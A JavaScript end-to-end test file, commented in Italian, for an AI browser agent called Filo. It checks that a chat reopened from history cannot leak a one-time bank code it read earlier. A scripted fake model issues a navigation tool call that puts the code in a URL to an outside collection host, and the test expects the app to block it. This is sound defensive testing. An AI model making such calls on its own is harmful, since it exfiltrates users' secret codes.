// Verifica #810, giro 3, rilievo 1: una chat riaperta dalla Cronologia non sa più cosa aveva letto
// da fuori, e il codice che vi compare esce.

import { test, expect } from '../../fixtures/electron.mjs';
import { cartellaInCasa } from '../../helpers/percorsi.mjs';
import { writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { CODICE, RACCOLTA, apertoVerso, preparaModelli, modelloFinto, newtab } from './aiuti.mjs';

const NAVIGA = { toolCalls: [{ id: 'n1', name: 'NAVIGA', arguments: JSON.stringify({ url: `https://${RACCOLTA}/c?v=${CODICE}` }) }] };

async function ultimaChat(page) {
  return page.evaluate(async () => {
    const r = await chrome.runtime.sendMessage({ type: 'filo_chats_list' });
    const chats = (r && r.chats) || [];
    return chats.length ? chats[0].id : null;
  });
}

// Riapre la chat come fa la Cronologia e chiede a Filo di finire l'accesso: il modello apre un
// indirizzo col codice. Torna 'aperto' se l'indirizzo è partito, 'fermato' se la riga di blocco c'è.
async function riapriEUsaIlCodice(app, openTab, page) {
  let id = null;
  await expect.poll(async () => { id = await ultimaChat(page); return id; }, { timeout: 10_000 }).toBeTruthy();
  await openTab(`filo://dashboard/dashboard.html?chat=${encodeURIComponent(id)}`);
  const riaperta = await newtab(app, 'filo://dashboard/dashboard.html?chat=');
  await expect(riaperta.locator('#input')).toBeVisible();
  await modelloFinto(app, { giri: [NAVIGA, { text: 'Fatto.' }] });
  await riaperta.locator('#input').fill('completa tu l’accesso sul sito');
  await riaperta.locator('#sendBtn').click();
  const deadline = Date.now() + 20_000;
  let esito = 'niente';
  while (Date.now() < deadline && esito === 'niente') {
    if (apertoVerso(app, RACCOLTA)) esito = 'aperto';
    else if (await riaperta.locator('.dash-activity-row', { hasText: 'Non ho aperto' }).count()) esito = 'fermato';
    else await new Promise((r) => setTimeout(r, 200));
  }
  // Il modello della chat riaperta ha davvero davanti il codice: non è un indirizzo inventato.
  expect(JSON.stringify(await app.evaluate(() => globalThis.__visti))).toContain(CODICE);
  return esito;
}

test('riaperta dalla Cronologia, la chat non porta fuori il codice che aveva letto dall’output di un comando', async ({ app, shell, openTab }) => {
  test.setTimeout(90_000);
  await expect(shell.locator('.tab')).toHaveCount(1, { timeout: 8_000 });
  const page = await newtab(app);
  await expect(page.locator('#input')).toBeVisible();
  await preparaModelli(app);
  await modelloFinto(app, {
    giri: [
      { toolCalls: [{ id: 'c1', name: 'ESEGUI_COMANDO', arguments: JSON.stringify({ comando: `echo "Il tuo codice monouso è ${CODICE}"` }) }] },
      { text: `La banca ti ha mandato il codice monouso ${CODICE}.` },
    ],
  });
  await page.locator('#input').fill('leggi la notifica della banca');
  await page.locator('#sendBtn').click();
  await expect(page.locator('.dash-bubble-filo', { hasText: 'La banca ti ha mandato' })).toBeVisible({ timeout: 20_000 });

  expect(await riapriEUsaIlCodice(app, openTab, page)).toBe('fermato');
});

test('riaperta dalla Cronologia, la chat non porta fuori il codice uscito da un comando lanciato a mano', async ({ app, shell, openTab }) => {
  test.setTimeout(90_000);
  const casa = cartellaInCasa('filo-verifica-810-');
  const file = join(casa, 'notifica.txt');
  writeFileSync(file, `Il tuo codice monouso è ${CODICE}\n`, 'utf8');
  try {
    await expect(shell.locator('.tab')).toHaveCount(1, { timeout: 8_000 });
    const page = await newtab(app);
    await expect(page.locator('#input')).toBeVisible();
    await preparaModelli(app);
    await page.reload();
    await expect(page.locator('#input')).toBeVisible();
    await page.locator('#input').fill(`/cat "${file}"`);
    await page.locator('#input').press('Enter');
    await expect(page.getByText(`Il tuo codice monouso è ${CODICE}`).first()).toBeVisible({ timeout: 15_000 });
    await modelloFinto(app, { giri: [{ text: 'Va bene.' }] });
    await page.locator('#input').fill('ok, ci penso dopo');
    await page.locator('#sendBtn').click();
    await expect(page.locator('.dash-bubble-filo', { hasText: 'Va bene.' })).toBeVisible({ timeout: 20_000 });

    expect(await riapriEUsaIlCodice(app, openTab, page)).toBe('fermato');
  } finally {
    rmSync(casa, { recursive: true, force: true });
  }
});
